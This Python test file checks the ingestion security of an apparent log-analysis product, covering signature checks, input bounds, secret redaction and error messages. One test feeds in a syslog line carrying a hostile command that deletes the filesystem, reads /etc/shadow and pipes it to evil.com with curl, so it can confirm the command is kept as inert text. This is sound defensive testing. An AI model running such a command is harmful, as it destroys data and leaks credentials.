"""CyberSentinel AI — Ingestion Security & Robustness Tests"""

import hashlib
import hmac
import time

import pytest

from packages.ingestion_auth import verify_source_signature
from services.ingestion.adapters import CloudTrailAdapter, SyslogAdapter
from services.ingestion.framework import IngestionException
from services.normalization.engine import NormalizationEngine


def test_source_signature_requires_exact_body_and_fresh_timestamp():
    body = b'{"events":[],"client_id":"connector-a"}'
    timestamp = str(int(time.time()))
    secret = "connector-secret"
    signature = hmac.new(
        secret.encode(),
        f"connector-a.{timestamp}.".encode() + body,
        hashlib.sha256,
    ).hexdigest()

    assert verify_source_signature(body, "connector-a", timestamp, signature, secret=secret)
    assert not verify_source_signature(
        body + b" ",
        "connector-a",
        timestamp,
        signature,
        secret=secret,
    )


def test_source_signature_rejects_stale_or_missing_credentials():
    assert not verify_source_signature(
        b"{}",
        "connector-a",
        str(int(time.time()) - 301),
        "invalid",
        secret="connector-secret",
    )
    assert not verify_source_signature(
        b"{}",
        "connector-a",
        str(int(time.time())),
        None,
        secret="connector-secret",
    )


def test_command_injection_payload_is_treated_as_untrusted_data():
    """Verify shell metacharacters in logs are safely parsed as data and never executed."""
    syslog = SyslogAdapter()
    malicious_line = "<34>Oct 16 12:00:00 server-01 app: test; rm -rf /; cat /etc/shadow | curl http://evil.com/ -d @-"
    records = syslog.parse_raw(malicious_line)
    assert len(records) == 1
    # Ensure raw command injection remains plain text in message field
    assert "rm -rf /" in records[0]["message"]
    assert "cat /etc/shadow" in records[0]["message"]


def test_oversized_payload_handling():
    """Verify oversized string inputs are bounded and do not cause denial of service."""
    engine = NormalizationEngine()
    giant_string = "A" * (500 * 1024)  # 500 KB string
    record = {
        "timestamp": "2026-10-16T12:00:00Z",
        "source_type": "windows",
        "source_name": "sysmon",
        "event_type": "process_creation",
        "command_line": giant_string,
    }
    result = engine.normalize(record)
    assert result.success is True
    assert result.event is not None
    assert len(result.event.command_line or "") == len(giant_string)


def test_credential_redaction_across_ingested_events():
    """Verify passwords, authorization tokens, and API keys are masked in to_redacted_dict()."""
    engine = NormalizationEngine()
    record = {
        "timestamp": "2026-10-16T12:00:00Z",
        "source_type": "cloud",
        "source_name": "aws",
        "event_type": "login",
        "raw_record": {
            "token": "ghp_VerySecretGitHubToken12345",
            "api_key": "AKIAIOSFODNN7EXAMPLE_SECRET_KEY",
            "user": "developer",
        },
    }
    result = engine.normalize(record)
    assert result.success is True
    assert result.event is not None

    redacted = result.event.to_redacted_dict()
    assert "VerySecretGitHubToken12345" not in str(redacted["raw_event"])
    assert "EXAMPLE_SECRET_KEY" not in str(redacted["raw_event"])
    assert redacted["raw_event"]["token"] == "********"
    assert redacted["raw_event"]["api_key"] == "********"
    assert redacted["raw_event"]["user"] == "developer"


def test_malformed_json_does_not_leak_internals():
    """Verify malformed JSON parsing raises clean IngestionException without internal paths."""
    adapter = CloudTrailAdapter()
    with pytest.raises(IngestionException) as exc_info:
        adapter.parse_raw("{invalid json string: 1234")
    msg = str(exc_info.value)
    assert "INVALID_JSON" in exc_info.value.error_code
    assert "C:\\" not in msg
    assert "/home/" not in msg
